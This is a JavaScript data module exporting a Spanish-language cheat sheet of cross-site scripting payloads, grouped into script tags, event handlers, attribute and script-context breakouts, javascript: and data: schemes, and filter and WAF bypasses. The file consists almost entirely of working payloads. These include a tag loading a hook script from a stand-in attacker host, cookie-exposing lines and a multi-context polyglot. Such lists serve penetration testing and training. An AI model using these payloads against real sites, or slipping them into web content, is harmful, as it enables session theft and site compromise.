export const CHEATSHEET_CATEGORIES = [
  {
    id: 'basic',
    name: 'Básicos & Etiquetas Script',
    description: 'Vectores fundamentales utilizados en contextos HTML directos.',
    payloads: [
      {
        title: 'Script Alert Clásico',
        payload: '<script>alert(1)</script>',
        description: 'La prueba de concepto más directa en contextos HTML desprotegidos.',
        context: 'HTML Body'
      },
      {
        title: 'Script con External Source',
        payload: '<script src="https://evil.example.com/hook.js"></script>',
        description: 'Carga un archivo JavaScript externo para ejecutar funciones complejas.',
        context: 'HTML Body'
      },
      {
        title: 'Script con Autofocus Prompt',
        payload: '<script>prompt(document.cookie)</script>',
        description: 'Despliega una ventana emergente prompt con las cookies del usuario.',
        context: 'HTML Body'
      }
    ]
  },
  {
    id: 'events',
    name: 'Event Handlers Inline (IMG, SVG, BODY)',
    description: 'Vectores que utilizan atributos de eventos estándar HTML5.',
    payloads: [
      {
        title: 'Image OnError',
        payload: '<img src="invalid_image.jpg" onerror="alert(document.domain)">',
        description: 'Se ejecuta automáticamente cuando la imagen no puede cargarse.',
        context: 'HTML Body / Filter Bypass'
      },
      {
        title: 'SVG OnLoad',
        payload: '<svg onload="alert(1)">',
        description: 'El parser SVG ejecuta onload inmediatamente sin depender de recursos externos.',
        context: 'XML / SVG Body'
      },
      {
        title: 'Body OnLoad / OnPageshow',
        payload: '<body onload="alert(1)">',
        description: 'Disparador a nivel de elemento raíz durante la renderización inicial.',
        context: 'HTML Tag'
      },
      {
        title: 'Input Autofocus OnFocus',
        payload: '<input autofocus onfocus="alert(1)">',
        description: 'Ejecución automática sin interacción del usuario gracias al autofocus.',
        context: 'HTML Form'
      },
      {
        title: 'Details OnToggle',
        payload: '<details open ontoggle="alert(1)">Contenido</details>',
        description: 'Se ejecuta al abrirse o inicializarse el componente nativo details.',
        context: 'HTML5 Semantic'
      },
      {
        title: 'Video / Audio OnError',
        payload: '<video src="x" onerror="alert(1)"></video>',
        description: 'Aprovecha el fallo de carga del contenedor multimedia.',
        context: 'HTML5 Media'
      }
    ]
  },
  {
    id: 'breakout',
    name: 'Escape de Atributos & Contextos JS',
    description: 'Payloads diseñados para romper comillas y estructuras circundantes.',
    payloads: [
      {
        title: 'Cierre de Atributo con Tag Script',
        payload: '"><script>alert(1)</script>',
        description: 'Rompe el atributo value o placeholder y abre un nuevo tag script.',
        context: 'Attribute Breakout'
      },
      {
        title: 'Atributo Inline OnMouseOver',
        payload: '" onmouseover="alert(1)" x="',
        description: 'Inyecta un nuevo manejador de evento manteniendo la sintaxis del tag original.',
        context: 'Attribute Context'
      },
      {
        title: 'Escape de Variable JavaScript',
        payload: '"; alert(1); //',
        description: 'Cierra una cadena de texto en un bloque script existente y anula el resto con comentarios.',
        context: 'Script Block'
      },
      {
        title: 'Cierre de Tag Script Padre',
        payload: '</script><script>alert(1)</script>',
        description: 'Fuerza al parser HTML a cerrar el bloque script actual e iniciar uno nuevo.',
        context: 'Script Block'
      }
    ]
  },
  {
    id: 'schemes',
    name: 'Pseudo-Protocolos (javascript:, data:)',
    description: 'Vectores aplicables a atributos href, src, action o formaction.',
    payloads: [
      {
        title: 'Anchor Href Javascript',
        payload: 'javascript:alert(document.cookie)',
        description: 'Se ejecuta al hacer clic o interactuar con el hipervínculo.',
        context: 'Link href'
      },
      {
        title: 'Form Action Pseudo-protocol',
        payload: '<form action="javascript:alert(1)"><button type="submit">Enviar</button></form>',
        description: 'Dispara el payload al enviar un formulario manipulado.',
        context: 'Form Action'
      },
      {
        title: 'Iframe con Data URI',
        payload: '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
        description: 'Carga un documento HTML embebido codificado con data scheme.',
        context: 'Iframe Source'
      }
    ]
  },
  {
    id: 'bypass',
    name: 'WAF & Filter Bypasses',
    description: 'Técnicas de evasión de listas negras, mayúsculas, comillas y filtros débiles.',
    payloads: [
      {
        title: 'Mayúsculas Alternadas (Case Variation)',
        payload: '<sCrIpt>alert(1)</sCrIpt>',
        description: 'Supera filtros que solo buscan la palabra exacta "script" en minúsculas.',
        context: 'Filter Bypass'
      },
      {
        title: 'Anidación No Recursiva',
        payload: '<scr<script>ipt>alert(1)</script>',
        description: 'Funciona cuando el backend reemplaza <script> una sola vez sin recursión.',
        context: 'Filter Bypass'
      },
      {
        title: 'String.fromCharCode (Sin Comillas)',
        payload: '<script>alert(String.fromCharCode(88,83,83))</script>',
        description: 'Ejecuta cadenas de texto sin requerir comillas simples o dobles.',
        context: 'Quote-Free'
      },
      {
        title: 'Template Literals con Backticks',
        payload: '<script>alert(`XSS-${document.domain}`)</script>',
        description: 'Usa backticks de ES6 para evadir restricciones sobre comillas.',
        context: 'Quote-Free'
      },
      {
        title: 'Polyglot Universal 0x01',
        payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/<titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
        description: 'Payload políglota diseñado para ejecutarse en más de 20 contextos distintos.',
        context: 'Universal Polyglot'
      }
    ]
  }
];
